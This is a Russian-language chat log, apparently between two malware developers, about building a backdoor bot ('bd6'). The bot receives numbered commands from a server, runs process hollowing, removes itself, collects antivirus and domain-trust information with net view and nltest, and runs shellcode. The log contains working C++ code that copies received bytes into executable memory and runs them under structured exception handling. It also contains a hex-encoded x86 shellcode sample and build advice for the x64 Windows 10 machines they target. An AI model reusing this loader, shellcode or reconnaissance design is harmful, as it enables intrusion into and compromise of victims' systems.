2020-08-12 14:05:51.259134	mushroom	price	Шел код обязательно в SEH, а то вс> накроется из за того что шел код может быть криво написан.
2020-08-12 14:06:14.552647	price	mushroom	то есть прерывание перехватывать
2020-08-12 14:06:18.215255	mushroom	price	Удалиться из системы это удалить свой загрузчик.
2020-08-12 14:06:18.425460	price	mushroom	?
2020-08-12 14:06:41.920927	price	mushroom	запустить сторонний процесс и килл и делетефаайл?
2020-08-12 14:06:51.635388	mushroom	price	Да. Исключение родное для Windows. C++ их не перехватывают.
2020-08-12 14:07:02.292566	price	mushroom	и из расписания удалить?
2020-08-12 14:07:20.052851	price	mushroom	щл
2020-08-12 14:07:26.785293	price	mushroom	ок,записал
2020-08-12 14:07:27.141125	mushroom	price	По поводу 100, удалить свой загрузчик и завершиться.
2020-08-12 14:08:04.213802	mushroom	price	Загрузчик ты ещё не начал делать, команда 100 пока без загрузчика это просто завершиться.
2020-08-12 14:08:13.810243	price	mushroom	я про загрузчик пока не думал, читал что в ТЗ написано, но пока работаю в автономном режиме bd6
2020-08-12 14:08:44.590506	price	mushroom	ну тогда пишем что exit мы сделали
2020-08-12 14:09:43.025094	mushroom	price	Значит осталось hollowing для 10, reset для работающего процесса если у него есть таймаут, шелл код, загрузка файла. Так?
2020-08-12 14:09:45.917594	price	mushroom	если у тебя  bd2 а у меня bd6, значит уже более 6 версий есть этого бота?
2020-08-12 14:09:56.247180	price	mushroom	да
2020-08-12 14:10:02.199779	price	mushroom	а вот вопрос
2020-08-12 14:10:30.374394	price	mushroom	net view идет 50 сек а иаймаут 30, как поступать?
2020-08-12 14:10:36.941415	price	mushroom	таймаут
2020-08-12 14:10:55.499418	price	mushroom	да и вообще сбор по команде 1
2020-08-12 14:11:05.831523	mushroom	price	Для команды 1 нету таймаута.
2020-08-12 14:11:38.787390	mushroom	price	Это не таймаут а время через которое запросить новую команду, после завершения команды 1.
2020-08-12 14:12:05.461222	price	mushroom	понял
2020-08-12 14:12:21.394020	price	mushroom	ждатьзавершения процессов всех а потом ещё таймаут?
2020-08-12 14:14:02.904421	mushroom	price	Команда 1 получается блокирующая. Выполнил её полностью (в том числе необходимые процессы), отправил результат и ждёшь это время, которое в этой команде пришло, подождал, запрос новой команды.
2020-08-12 14:14:04.673693	price	mushroom	вот эта команда тоже в cmd.exe отрабатывает, а в createprocess не находит файла - ошибка 2
2020-08-12 14:14:25.844413	price	mushroom	понятно про команду 1
2020-08-12 14:14:58.476026	price	mushroom	я много времени потратил, когда антивирусы собирал с отключенным центром безопасности
2020-08-12 14:15:19.084095	price	mushroom	ну и с версией антивируса тоже были вопросы
2020-08-12 14:15:49.763850	price	mushroom	я через wmi их собираю
2020-08-12 14:16:36.971857	mushroom	price	вот эта команда тоже в cmd.exe отрабатывает, а в createprocess не находит файла - ошибка 2
2020-08-12 14:16:45.297903	price	mushroom	да
2020-08-12 14:16:46.075668	mushroom	price	Это про что?
2020-08-12 14:17:57.470439	price	mushroom	так было раньше, сейчас у меня другая версия исполнения bat/PS не проверял ещё, но реально все другие команды отрабатывали (не сервер поэтому писали что нет информации) а эта команда писала ошибка 2
2020-08-12 14:18:29.036135	price	mushroom	выяснится в свое время, конечно, просто из любопытства спросил
2020-08-12 14:18:37.158426	mushroom	price	net view /all /domain
2020-08-12 14:18:42.255639	mushroom	price	Эта команда?
2020-08-12 14:19:19.368231	price	mushroom	эти отрабатывали, говорили что не сервер, а не находилась команда trust=результат команды nltest /domain_trusts /all_trusts
2020-08-12 14:19:35.901999	mushroom	price	Её не нужно через что то запускать. Сразу CreateProcess net view /all /domain
2020-08-12 14:19:50.806107	mushroom	price	Так всё работает?
2020-08-12 14:19:51.657312	price	mushroom	а траст?
2020-08-12 14:20:12.385777	mushroom	price	Все что в команде 1 можно запускать сами по себе.
2020-08-12 14:20:12.759365	price	mushroom	так все работает, не находит среды, у меня просто виндуз
2020-08-12 14:20:40.306382	price	mushroom	понял попробую
2020-08-12 14:20:57.656725	mushroom	price	Я думаю потому что эти утилиты все в System32 лежат.
2020-08-12 14:21:07.036716	price	mushroom	я всё находил
2020-08-12 14:21:16.665347	price	mushroom	и полный путь подставлял
2020-08-12 14:21:29.165116	price	mushroom	проверял в простой ком.строке - отрабатывает
2020-08-12 14:21:37.300213	mushroom	price	Не нужно они системные. Как cmd например.
2020-08-12 14:21:55.158595	price	mushroom	в криэйтпроцесс - последняя ошибка 2 - нет файла
2020-08-12 14:22:09.918290	price	mushroom	попробую, спасибо
2020-08-12 14:22:33.973944	price	mushroom	вот ещё
2020-08-12 14:23:16.046254	price	mushroom	если в bat ставлю cmd.exe /c - не работает, без /c - работает!
2020-08-12 14:23:38.701217	mushroom	price	Надо cmd /c \"..\"
2020-08-12 14:23:41.780757	price	mushroom	в createprocess когда cmd  запускаю
2020-08-12 14:23:57.693347	mushroom	price	В кавычки брать команду для cmd.
2020-08-12 14:24:20.287610	mushroom	price	Там же пробелы есть.
2020-08-12 14:24:26.225608	price	mushroom	я же команду в пайп запихиваю
2020-08-12 14:24:45.512016	mushroom	price	А ты про команду 10.
2020-08-12 14:24:49.204300	price	mushroom	то есть cmd /c \". запихнул и допихнул \"
2020-08-12 14:25:08.023114	price	mushroom	нет - это команда 12
2020-08-12 14:25:27.208205	price	mushroom	хорошо,, направление есть проверю
2020-08-12 14:25:28.873900	mushroom	price	Если через пайп то просто cmd
2020-08-12 14:25:34.345172	price	mushroom	но и без /c работает
2020-08-12 14:25:39.616511	price	mushroom	вотвот
2020-08-12 14:25:51.938763	mushroom	price	Я и говорю что через пайп просто cmd
2020-08-12 14:26:07.723519	mushroom	price	А PowerShell -Command -
2020-08-12 14:26:17.416473	price	mushroom	это да ПС ннорм
2020-08-12 14:26:17.897051	mushroom	price	Если через пайп.
2020-08-12 14:26:44.720484	price	mushroom	букву С можно даже маленькой
2020-08-12 14:27:02.719651	price	mushroom	или просто с
2020-08-12 14:27:08.215625	price	mushroom	-с -
2020-08-12 14:27:25.521643	mushroom	price	Буду знать.
2020-08-12 14:27:56.794901	price	mushroom	внешний IP все сайты обходить (на случай что ктото выбыл)
2020-08-12 14:28:27.773175	price	mushroom	я вот тут беру http://checkip.dyndns.org
2020-08-12 14:28:32.282054	mushroom	price	Не надо. Не прокатило, пустое поле значит будет.
2020-08-12 14:28:53.051530	mushroom	price	Можешь парочку сделать, но не обязательно.
2020-08-12 14:29:12.387581	price	mushroom	там политика не чаще раз в 10 минут
2020-08-12 14:29:18.539500	mushroom	price	Если что не удалось получить пустое поле передавай тогда в ответе для команды 1.
2020-08-12 14:29:21.232517	price	mushroom	думал я
2020-08-12 14:29:53.587379	price	mushroom	а вотт про версию антивира - тоже можно пустое поле или добраться до инфы
2020-08-12 14:30:14.143383	mushroom	price	Пустое можно.
2020-08-12 14:30:17.499186	price	mushroom	сейчас только через определение программы запуска АВ и от него версию файла беру
2020-08-12 14:30:27.360649	mushroom	price	Главное чтобы они все были.
2020-08-12 14:30:38.813579	price	mushroom	раньше была такая информация теперь нет, но есть стартовый адрес
2020-08-12 14:30:39.519558	mushroom	price	Поля.
2020-08-12 14:30:49.314390	price	mushroom	поля понятно
2020-08-12 14:31:23.532199	price	mushroom	а вот например мне в выдаче сейчас аваст только выдает а дифендер куда то спрятался, как быть?
2020-08-12 14:31:53.919413	mushroom	price	Что выда>т то и посылай.
2020-08-12 14:31:56.998404	price	mushroom	это тоже эпопея была, у меня всё отключено было, видно такая продвинутая сборка
2020-08-12 14:32:14.777808	price	mushroom	а вдруг не допрашиваю как то
2020-08-12 14:32:31.739058	price	mushroom	а вот список процессов и установленных програм там до фига синонимов
2020-08-12 14:33:01.366613	price	mushroom	ну хоть бы с ПИД  были процессы а так scvhostили типа того
2020-08-12 14:33:10.503654	price	mushroom	я их неизбыточно посылаю
2020-08-12 14:33:32.076599	price	mushroom	и из 3 источников принимаю инфу
2020-08-12 14:33:50.594686	price	mushroom	из реестра и ещё из MSI
2020-08-12 14:34:16.283676	mushroom	price	И как не дублируется?
2020-08-12 14:34:37.773325	price	mushroom	бегу по списку найденных и не включаю в внего если уже включен
2020-08-12 14:34:55.497257	mushroom	price	А, так.
2020-08-12 14:35:03.166892	price	mushroom	а как ещё
2020-08-12 14:35:16.797748	mushroom	price	Как хочешь.
2020-08-12 14:35:18.793162	price	mushroom	и то 468 программ а так больше 1000
2020-08-12 14:36:33.432037	price	mushroom	короче я стремлюсь к финишу, ныряю обратно,  сегодня в трекер отпишу, к понедельнику уже выйду с последними вопросами(холовинг если возникнут, обфускация и тп)
2020-08-12 14:36:53.988980	mushroom	price	Не забудь загрузить в GitLab и в Redmine написать. Я потом посмотрю.
2020-08-12 14:36:56.102688	price	mushroom	но база уже готова и будет налажена окончательно
2020-08-12 14:37:06.132476	mushroom	price	OK.
2020-08-12 14:37:06.709657	price	mushroom	я  проо это и сказал
2020-08-12 14:37:36.527269	price	mushroom	я про это помню всегда, но реально либо в отладочном состоянии либо валюсь спать
2020-08-12 14:37:46.457680	price	mushroom	пока
2020-08-12 14:37:56.840010	mushroom	price	Пока.
2020-08-12 14:38:10.086177	price	mushroom	спасибо
2020-08-17 08:58:02.807856	mushroom	price	Привет. Напиши когда загрузишь на GitLab обновление для бота и можно будет смотреть.
2020-08-17 08:58:33.399440	price	mushroom	да хоть сейчас загружу и посмотришь, я отлаживаюсь
2020-08-17 08:58:53.338705	price	mushroom	минут через 10
2020-08-17 09:15:40.305459	price	mushroom	загрузил, смотри
2020-08-17 09:16:26.214719	price	mushroom	nltest  так и не заработал
2020-08-17 09:16:51.912709	price	mushroom	все остальные сетевые команды работают, а эту не находит
2020-08-17 09:20:39.519747	mushroom	price	А в командной строке работает?
2020-08-17 09:21:10.532240	price	mushroom	просто в строке и в powershelle работает
2020-08-17 09:21:38.568468	price	mushroom	когда из под createprocess запускаюю и там и тут не запускается, так же как и отдельным экзешником
2020-08-17 09:22:02.859100	price	mushroom	я и с полным путем запускал
2020-08-17 09:22:53.016799	price	mushroom	если проект соберется, то там можно раскомментировать сразу в начале старт пускателя (launcher) и в нем предустановлены уже все установки
2020-08-17 09:23:19.429136	price	mushroom	и можно выполнить лончер и посмотреть что возвращается в stdout
2020-08-17 09:46:23.073809	mushroom	price	Падает постоянно на команде 1.
2020-08-17 09:47:20.094185	mushroom	price	Вот здесь:
lstrcatA(SystemInfo, "&trust=");
//icommand = 10;cmdline = "c:\\windows\\system32\\nltest.exe /DOMAIN_TRUSTS"; 
icommand = 10; cmdline = "c:\\windows\\system32\\nltest.exe";
ipid = launcher(&netLists, icommand, URI, cmdline, iruntype, imaskprocess, itimeout); lstrcatA(SystemInfo, netLists); heapFree(netLists);
2020-08-17 09:47:25.187403	price	mushroom	минутку
2020-08-17 09:52:03.672797	price	mushroom	Launch last errorcode 2
2020-08-17 09:52:38.348971	price	mushroom	у меня сразу вылетает CreateProcess с кодом 2 - нет файла
2020-08-17 09:53:42.448123	price	mushroom		DWORD icommand = 10, iruntype = 1, imaskprocess = 0, itimeout = 30;
	CHAR* resultarea=0,*URI="", *cmdline="c:\\windows\\system32\\nltest.exe /domain_trusts /all_trusts";
	launcher(&resultarea, icommand, URI, cmdline, iruntype, imaskprocess, itimeout);
2020-08-17 09:53:51.873374	mushroom	price	А если cmdline = "nltest /domain_trusts /all_trusts"
2020-08-17 09:54:29.967599	price	mushroom	и ещё -туда же вбей net /view
2020-08-17 09:55:12.174333	price	mushroom	без полного пути-тоже код 2
2020-08-17 09:56:38.050808	mushroom	price	У меня в любом случае исключение. Хоть как не пиши.
2020-08-17 09:57:20.250913	mushroom	price	Hollowing не работает.
2020-08-17 09:58:29.998401	price	mushroom	это нет, я в другое всё время положил. Пробовал SEH.
2020-08-17 10:00:25.740513	price	mushroom	ещё я длл запускаю, но не получаю с сервера, локально отлаживал
2020-08-17 10:01:05.302893	price	mushroom	сейчас соеди посылку с путем с сервера, сохранение с рандомным именем и запускню
2020-08-17 10:01:31.139201	price	mushroom	Системная ошибка 6118.
Недоступен список серверов для этой рабочей группы.
2020-08-17 10:01:46.066989	price	mushroom	* cmdline = "net view /all";
	launcher(&resultarea, icommand, URI, cmdline, iruntype, imaskprocess, itimeout);
2020-08-17 10:02:25.264159	price	mushroom	вот это работает, а то сразу из CreateProcess свинчивается на выход с последним кодом 2
2020-08-17 10:03:04.288903	mushroom	price	У меня тоже код 2. Хотя в моём боте работает nltest.
2020-08-17 10:03:15.348951	mushroom	price	Где то у тебя ошибка.
2020-08-17 10:03:22.690345	price	mushroom	именно это меня и возмущает
2020-08-17 10:03:26.486853	price	mushroom	да
2020-08-17 10:03:47.267016	price	mushroom	но в чем? - это же голый api
2020-08-17 10:04:24.355693	price	mushroom	во -точно, сейчас соберу проект только из createprocess
2020-08-17 10:04:56.401057	price	mushroom	f ns ujdjhbk? xnj dbcytn-'nj rfr& ghjljk;ftncz &
2020-08-17 10:05:13.526085	price	mushroom	а ты говорил что виснет, - это как - продолжается?
2020-08-17 10:05:47.184375	mushroom	price	Что виснет?
2020-08-17 10:06:14.023150	price	mushroom	[12:46:22] <mushroom> Падает постоянно на команде 1.
2020-08-17 10:07:03.980414	price	mushroom	я это понял, что виснет, вылетает , плохо вобщем
2020-08-17 10:07:11.778242	mushroom	price	Не виснет, там где то NULL указатель и программа падает.
2020-08-17 10:07:49.652958	price	mushroom	дит?
2020-08-17 10:08:20.570322	price	mushroom	просто запускается и падает или с сервера команда приходит?
2020-08-17 10:08:46.433140	mushroom	price	ipid = launcher(&netLists, icommand, URI, cmdline, iruntype, imaskprocess, itimeout); lstrcatA(SystemInfo, netLists); heapFree(netLists);
2020-08-17 10:08:52.500263	mushroom	price	На этой строчке.
2020-08-17 10:09:58.686844	price	mushroom	вообще это просто так строка стоит,  если перед DoInternet(), для иллюстрации nltest
2020-08-17 10:10:25.741333	price	mushroom	нет, понял
2020-08-17 10:10:50.854086	price	mushroom	это другое место - это запрос сетевых команд в getsysteminfo
2020-08-17 10:15:29.996990	price	mushroom	вот здесь поставил - 	resultarea = GetSystemInfo();
	                    DoInternet();             отработало, но твой случай перебивает мой, я в другие машины не выходил ещё
2020-08-17 10:17:16.193861	mushroom	price	Серьезность	Код	Описание	Проект	Файл	Строка	Состояние подавления
Ошибка	LNK2019	ссылка на неразрешенный внешний символ _memset в функции "int __cdecl launcher(char * *,unsigned long,char *,char *,unsigned long,unsigned long,unsigned long)" (?launcher@@YAHPAPADKPAD1KKK@Z).	bd6	C:\Users\ivana\Projects\others\bd6\backdoor\launcher.obj	1
2020-08-17 10:17:26.550279	mushroom	price	Не собирается.
2020-08-17 10:17:54.376747	price	mushroom	ты же запускал!
2020-08-17 10:18:06.652591	price	mushroom	чтото добавил?
2020-08-17 10:18:15.006351	mushroom	price	Да. Теперь не собирается.
2020-08-17 10:18:27.131762	price	mushroom	там без CRT
2020-08-17 10:18:50.897824	price	mushroom	вместо memset надо писать lmemset
2020-08-17 10:19:16.508126	mushroom	price	Я нигде не писал memset.
2020-08-17 10:19:26.318229	mushroom	price	Это твой _memset
2020-08-17 10:19:53.443499	mushroom	price	Я его в проекте не могу найти.
2020-08-17 10:20:19.071363	price	mushroom	там ни одного нет, они не находят линковки
2020-08-17 10:20:47.853799	price	mushroom	это как раз в launcher
2020-08-17 10:20:52.688647	price	mushroom	пишет
2020-08-17 10:21:27.446719	mushroom	price	Ты x64 пробовал запускать версию.
2020-08-17 10:21:34.859584	price	mushroom	нет
2020-08-17 10:21:50.318849	price	mushroom	только х86 дебаг
2020-08-17 10:21:54.078990	mushroom	price	В настройках проекта только Win32 вижу.
2020-08-17 10:22:03.612493	mushroom	price	А я запускаю x64 Debug
2020-08-17 10:22:07.475059	price	mushroom	там только это и есть
2020-08-17 10:22:25.831654	price	mushroom	перейди на вин32, 64 сделаю
2020-08-17 10:23:01.777231	mushroom	price	Сделай чтобы x64 было тоже, 99 процентов это x64 Win 10, мы сейчас x86 вообще в работе не используем.
2020-08-17 10:23:19.714621	price	mushroom	конечно, сделаю
2020-08-17 10:23:48.907116	mushroom	price	Вот у меня и падает и _memset не находится.
2020-08-17 10:23:57.064186	mushroom	price	Сделаешь напишешь тогда.
2020-08-17 10:24:02.818378	price	mushroom	хорошо
2020-08-17 10:24:16.835099	price	mushroom	сейчас погенерю
2020-08-17 10:28:03.225046	mushroom	price	У тебя в Release указан флаг /MTd
2020-08-17 10:28:12.724944	mushroom	price	А должен быть /MT
2020-08-17 10:28:13.321624	price	mushroom	да
2020-08-17 10:28:26.201529	price	mushroom	4 модуля на выходе
2020-08-17 10:28:35.285985	price	mushroom	с дебагом и без 64 и 86
2020-08-17 10:28:43.827936	price	mushroom	я так понял тз
2020-08-17 10:29:01.271404	mushroom	price	Дебаг это Debug
2020-08-17 10:29:20.473536	mushroom	price	Всё остальное это Release с /MT
2020-08-17 10:29:52.801549	mushroom	price	Там должно быть Debug, Release с логами, Release_nologs без логов.
2020-08-17 10:30:21.485612	price	mushroom	а логи-это что7
2020-08-17 10:30:47.485276	mushroom	price	То что ты в консоль пишешь для отладки.
2020-08-17 10:30:58.892115	price	mushroom	ну да
2020-08-17 10:31:14.959341	mushroom	price	Ещё нужно это же в файл писать.
2020-08-17 10:31:28.348478	price	mushroom	Multi-threaded Debug (/MTd)
2020-08-17 10:31:31.850725	mushroom	price	Чтобы тестер тебе логи давал когда ошибки найдёт.
2020-08-17 10:32:08.920483	price	mushroom	может и написано в релизе что-то, но я только дебаг х86 писал
2020-08-17 10:32:21.560385	price	mushroom	там произвольные значения могут быть
2020-08-17 10:32:30.433178	price	mushroom	сейчас х64 сделаю
2020-08-17 10:32:52.915039	price	mushroom	одновременно на консоль и в файл писать?
2020-08-17 10:33:00.498753	mushroom	price	Да.
2020-08-17 10:33:27.750907	mushroom	price	Это сделаешь когда все команды отладишь.
2020-08-17 10:33:54.296808	mushroom	price	Файл для тестера нужен.
2020-08-17 10:34:10.870613	price	mushroom	понятно
2020-08-17 10:34:25.502594	mushroom	price	Для себя как хочешь пиши отладочный вывод. Желательно его поподробнее писать.
2020-08-17 10:34:57.608847	price	mushroom	в выдаче отладки, что отмечать?
2020-08-17 10:35:35.456496	mushroom	price	Всё что тебе нужно чтобы быстро понять в чём и где ошибка в случае чего.
2020-08-17 10:36:38.086020	mushroom	price	Ход выполнения программы и по нему сразу поймёшь где ошибка произошла.
2020-08-17 10:40:30.978989	mushroom	price	По поводу nltest:
STARTUPINFO startupInfo = { 0 };
startupInfo.cb = sizeof(STARTUPINFO);
PROCESS_INFORMATION procInfo = { 0 };
createProcess(NULL, tmpFilename, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, currDir, &startupInfo, &procInfo)
2020-08-17 10:40:50.687927	mushroom	price	Так тупо попробуй запустить.
2020-08-17 10:40:55.580223	price	mushroom	ok
2020-08-17 10:41:06.367226	mushroom	price	cmdline должно быть не const
2020-08-17 10:41:22.056149	mushroom	price	А у тебя const вроде.
2020-08-17 10:41:40.547624	price	mushroom	а другие почему стартуют?
2020-08-17 10:41:48.818920	mushroom	price	А нет ты сначала strcopy делаешь.
2020-08-17 10:41:56.475622	price	mushroom	я  про const видел в процессе выяснения
2020-08-17 10:47:53.368192	mushroom	price	Типа так:
STARTUPINFO startupInfo = { 0 };
startupInfo.cb = sizeof(STARTUPINFO);
PROCESS_INFORMATION procInfo = { 0 };
cmd[] = TEXT("nltest /domain_trusts /all_trusts");
createProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &procInfo);
2020-08-17 10:48:54.192785	mushroom	price	Так должно запуститься. Потом ищи разницу у себя, почему не запускается.
2020-08-17 10:49:16.355253	price	mushroom	спасибо
2020-08-17 11:57:26.583073	price	mushroom	сейчас повнимательнее увидел, а кто придумал хекс код через пробел целый мегабайт пересылать?
2020-08-17 11:57:57.924523	price	mushroom	правильно ли это или можно пробелы не посылать?
2020-08-17 11:59:04.571554	mushroom	price	Можно без пробелов. Главное что 2 символа это один байт был.
2020-08-17 11:59:18.219286	price	mushroom	этото понятно
2020-08-17 11:59:47.672803	price	mushroom	просто пробел он же не сжимается и занимает пространство
2020-08-17 12:00:15.388766	mushroom	price	Это не критично.
2020-08-17 12:02:21.293506	price	mushroom	а вот ещё, когда делаешь повтор команды run code, сервер плодит номер команды перед скриптом.
2020-08-17 12:03:10.155547	price	mushroom	то есть посылает не просто скрипт , а номер команды и скрипт в скрипт
2020-08-17 12:03:18.628101	mushroom	price	17 %hexcode%
2020-08-17 12:03:29.857923	mushroom	price	Ну так и надо.
2020-08-17 12:03:36.471053	price	mushroom	нет, не сюда
2020-08-17 12:03:43.932832	price	mushroom	а в окошко
2020-08-17 12:03:47.238988	price	mushroom	на сервере
2020-08-17 12:04:05.905460	price	mushroom	не должно так, приходится все время стирать
2020-08-17 12:04:26.023169	mushroom	price	Это не наша проблема.
2020-08-17 13:35:06.022969	price	mushroom	Не удалось перечислить доверия домена: Status = 1722 0x6ba RPC_S_SERVER_UNAVAILABLE
2020-08-17 13:35:19.386978	price	mushroom	вот получилось извлечь
2020-08-17 13:35:42.136932	mushroom	price	Всё правильно.
2020-08-17 13:36:04.728462	price	mushroom	ну и все получено на х64 дебаг
2020-08-17 13:37:29.128389	mushroom	price	Хорошо.
2020-08-17 13:38:07.180632	price	mushroom	сейчас пойму почему не встраивалось, встрою и выложу
2020-08-17 13:38:52.922804	price	mushroom	пока трудился попутно шеллы запускать начал, простенькие типа 9090c3
2020-08-17 13:41:26.125138	mushroom	price	Там подстраховаться SEH.
2020-08-17 13:41:35.312416	mushroom	price	Главное.
2020-08-17 13:41:50.032562	price	mushroom	вот это -**па
2020-08-17 13:42:20.411727	price	mushroom	я всю ночь пытался встроить, все эти стековые регистрации знаю наизусть.
2020-08-17 13:43:11.904401	price	mushroom	без CRT практически не возможно, теоретически люди пишут что легко
2020-08-17 13:44:38.297807	price	mushroom	буду пробовать дальше
2020-08-17 13:45:29.911925	mushroom	price	Что без CRT не возможно?
2020-08-17 13:45:36.543147	price	mushroom	я весь NtosKrnl.lib  исползал на дебагере
2020-08-17 13:45:52.180850	price	mushroom	SEH exceptions  Конструкции try-except и try-finally без CRT
- you could use them if you implement _C_specific_handler (for 64-bit code) and _except_handler3 (for 32-bit code) functions. 
See simple expample how to do that by calling original C runtime functions in win32_crt_seh.cpp file.
Для  использования  конструкций блоков исключений и финализации следует позаботиться о наличии в программе процедуры, которую компилятор подставляет вместо реального хендлера: для x86-проектов это __except_handler3, а для x64 — __C_specific_handler. 
В этих процедурах производится собственная диспетчеризация: поиск и вызов необходимых хендлеров, а также раскрутка стека. 
Для х86-проекта можно просто подключить NtosKrnl.lib из директории C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x86,
для x64 -NtosKrnl.lib из директории C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x64.
2020-08-17 13:46:09.945771	mushroom	price	Не парься с этим.
2020-08-17 13:46:27.234205	price	mushroom	чтобы был seh придется
2020-08-17 13:46:33.112059	mushroom	price	У меня так:
_Success_(return != 0)
BOOL Commander::runBinaryCode(_In_reads_bytes_(codeSize) LPCBYTE code, _In_ SIZE_T codeSize)
{
    PVOID codeAddr = kernel32.virtualAlloc(NULL, codeSize, MEM_COMMIT, PAGE_READWRITE);
    if (!codeAddr)
        return FALSE;

    DWORD err = ERROR_SUCCESS;
    CopyMemory(codeAddr, code, codeSize);
    DWORD old = 0;
    if (!kernel32.virtualProtect(codeAddr, codeSize, PAGE_EXECUTE, &old))
    {
        err = kernel32.getLastError();
        kernel32.virtualFree(codeAddr, codeSize, MEM_DECOMMIT);
        kernel32.setLastError(err);
        return FALSE;
    }

#ifdef _MSC_VER
    BOOL success = TRUE;
    __try
    {
        (*(VOID(*)())codeAddr)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
    }
#endif // _MSC_VER

    kernel32.virtualFree(codeAddr, codeSize, MEM_DECOMMIT);
    kernel32.setLastError(err);
#ifdef _MSC_VER
    return success;
#else
    return TRUE;
#endif // _MSC_VER
}
2020-08-17 13:46:52.632993	mushroom	price	Вот и весь SEH:
__try
   {
       (*(VOID(*)())codeAddr)();
   }
   __except (EXCEPTION_EXECUTE_HANDLER)
   {
       success = FALSE;
   }
2020-08-17 13:47:22.855213	price	mushroom	я попробую, но там дикие проблемы возникают
2020-08-17 13:47:32.295134	price	mushroom	либо ты знаешь, либо не пробовал
2020-08-17 13:47:48.395054	mushroom	price	Я пробовал.
2020-08-17 13:48:15.562468	price	mushroom	молодец тогда сейчас nltest встрою и СЕХ твой привинчу
2020-08-17 13:48:23.854355	mushroom	price	33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 F3 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 6C 8B CC 57 57 51 57 FF D0
2020-08-17 13:49:06.997232	mushroom	price	Окно Hello World для x86, потом гарантированная ошибка, так как стек там не восстанавливается.
2020-08-17 13:49:08.093843	price	mushroom	спасибо, а то у меня калькулятора на машине нет, а ноутпэд х64
2020-08-17 13:49:18.952064	mushroom	price	Для этого и нужен SEH.
2020-08-17 13:49:24.550293	price	mushroom	я понял
2020-08-17 13:49:29.034079	mushroom	price	На x64 сразу ошибка.
2020-08-17 13:53:17.230284	price	mushroom	не фигасе получил сообщение &trust=Не удалось получить поставщика служб шифрования (ошибка=2148073501)
2020-08-17 13:53:28.113749	price	mushroom	зачётное?
2020-08-17 13:54:15.622305	mushroom	price	Это для команды nltest?
2020-08-17 13:54:19.963141	price	mushroom	да
2020-08-17 13:54:26.817709	price	mushroom	только что вылезло
2020-08-17 13:54:55.118819	mushroom	price	Что выводит то и посылай. У тебя это выводит значит. У меня другое, у кого то третье.
2020-08-17 13:55:11.630885	price	mushroom	у меня раньше капчей была команда набрана, может изза этого?
2020-08-17 13:55:37.015370	price	mushroom	воттак
2020-08-17 13:55:38.438733	price	mushroom	nltest.exe /DOMAIN_TRUSTS
2020-08-17 13:55:49.894606	price	mushroom	nltest.exe /domain_trusts
2020-08-17 13:56:15.072117	mushroom	price	А надо nltest /domain_trusts /all_trusts
2020-08-17 13:56:25.190275	price	mushroom	я для примера
2020-08-17 13:56:30.557364	price	mushroom	так то у меня всё есть
2020-08-17 13:56:37.658538	mushroom	price	И без exe пиши.
2020-08-17 13:57:58.232261	price	mushroom	а с try exception большие сомнения. я так делал. я даже все unresolved убрал.
2020-08-17 13:58:18.188435	price	mushroom	но она мне дает unhandled exception c00005
2020-08-17 13:58:37.812917	mushroom	price	Нужно __try __except
2020-08-17 13:58:52.601067	mushroom	price	Это родные для Windows исключения.
2020-08-17 13:59:09.832978	price	mushroom	так и делаю по памяти не вспомнил точный синтаксис
2020-08-17 13:59:26.044486	mushroom	price	Я выше написал пример.
2020-08-17 13:59:27.920539	price	mushroom	но сильно к mvscrt привязаны
2020-08-17 13:59:45.187636	price	mushroom	я такой же писал, когда есть crt это не проблема
2020-08-17 14:00:03.840657	mushroom	price	Ничего не поделаешь, по этому флаг /MT для статической линковки.
2020-08-17 14:04:54.203857	price	mushroom	а нельзя какой нибудь тред запустить, и пусть он там сам выполняет задание и выживает как хочет?
2020-08-17 14:05:54.043031	mushroom	price	Это если таймаут 0.
2020-08-17 14:06:18.592351	mushroom	price	На стогда судьба процесса не интересует.
2020-08-17 14:06:33.413866	price	mushroom	я в смысле чтобы без SEH
2020-08-17 14:07:00.198499	mushroom	price	Не получиться шелл код всю программу уложит.
2020-08-17 14:07:13.610635	mushroom	price	Нужен SEH.
2020-08-17 14:07:41.237008	price	mushroom	буду ковырять, половину библиотеки уже знаю, осталась другая
2020-08-17 14:08:26.997043	mushroom	price	Доделай hollowing. Это в основном используется в работе.
2020-08-17 14:08:41.802358	price	mushroom	хорошо
2020-08-17 14:08:54.134374	mushroom	price	Hollowing в приоритете и сценарии.
2020-08-17 14:08:58.316659	price	mushroom	сейчас х64 в гитлаб укладываю
2020-08-17 15:33:48.305180	price	mushroom	а как плюс высветить между UTC и 3, кто-то съедает. Я уже и по три штуки ставил и в кавычках, не помогает!
2020-08-17 15:43:00.345635	mushroom	price	Пиши другое что нибудь вместо плюса. Пробел, минус.
2020-08-17 15:43:39.139932	price	mushroom	пробел сам получается вместо плюса, минус нормально печатается.
2020-08-17 15:43:39.472366	mushroom	price	+ наверное в url нельзя.
2020-08-17 15:43:55.348787	mushroom	price	Оставляй так.
2020-08-17 15:43:58.118848	price	mushroom	может словами?
2020-08-17 15:44:05.413753	mushroom	price	Пусть пробел сам получается.
2020-08-17 15:44:10.738367	price	mushroom	ок
2020-08-19 09:17:59.145854	mushroom	price	Привет. Команда 1 антивирус РђРЅС‚РёРІРёСЂСѓСЃРЅР°СЏ РїСЂРѕРіСЂР°РјРј
2020-08-19 09:18:17.696987	price	mushroom	привет
2020-08-19 09:18:40.334692	mushroom	price	А должен быть Windows Defender.
2020-08-19 09:18:50.178954	mushroom	price	Остальное в команде 1 нормально.
2020-08-19 09:19:00.020700	price	mushroom	У меня нет дефендера
2020-08-19 09:19:05.152689	price	mushroom	у меня аваст
2020-08-19 09:19:16.138745	mushroom	price	Всё равно.
